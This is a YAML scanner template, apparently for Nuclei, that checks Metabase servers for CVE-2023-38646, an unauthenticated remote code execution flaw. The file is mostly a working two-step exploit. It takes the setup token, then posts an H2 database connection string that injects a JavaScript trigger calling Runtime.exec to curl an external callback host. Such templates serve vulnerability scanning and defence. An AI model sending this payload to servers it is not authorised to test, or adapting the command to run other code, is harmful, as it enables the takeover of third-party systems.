id: CVE-2023-38646

info:
  name: Metabase 未授权 RCE
  author: wjlin0
  severity: critical
  description: 滥用 H2 数据库参数来执行任意代码。
  tags: cve,h2,metabase,rce
  metadata:
    quake-query: app="Metabase"
  reference:
    - https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
http:
  - raw:
      - |-
        GET /api/session/properties HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

      - |-
        POST /api/setup/validate HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Content-Length: 900

        {
            "token": 	"{{token}}",
            "details":
            {
                "is_on_demand": false,
                "is_full_sync": false,
                "is_sample": false,
                "cache_ttl": null,
                "refingerprint": false,
                "auto_run_queries": true,
                "schedules": {},
                "details": {
                    "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('curl http://{{interactsh-url}}')\n$$--=x",
                    "advanced-options": false,
                    "ssl": true
                },
                "name": "an-sec-research-team",
                "engine": "h2"
            }
        }
  
    extractors:
      - type: json
        name: token
        part: body_1
        internal: true
        json:
          - '."setup-token"'
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"
          - "http"
# digest: 490a0046304402204c31c2a46f2487eecf18673a9a76ba9b450132db904d5d5f26008ded790f76a2022055ba2006f6da4ce967c160eda2f28e9566c0afba0b4082dae94926ed506d76aa:9d8cf424f0e932381bf27cf1e926b867